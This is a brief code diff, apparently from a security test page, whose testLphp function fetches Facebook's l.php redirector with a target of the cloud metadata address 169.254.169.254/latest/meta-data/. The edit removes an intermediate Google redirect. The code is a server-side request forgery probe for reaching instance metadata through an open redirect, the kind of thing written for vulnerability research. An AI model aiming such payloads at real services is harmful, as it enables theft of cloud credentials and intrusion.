@@ -42,7 +42,7 @@ document.getElementById('info').innerText =
   'Dominio: ' + document.domain;
 
 function testLphp() {
-    const url = 'https://l.facebook.com/l.php?u=https://google.com/url?q=http://169.254.169.254/latest/meta-data/';
+    const url = 'https://l.facebook.com/l.php?u=http://169.254.169.254/latest/meta-data/';
     document.getElementById('resultado').innerText = 'Haciendo fetch a l.php...';
     
     fetch(url)
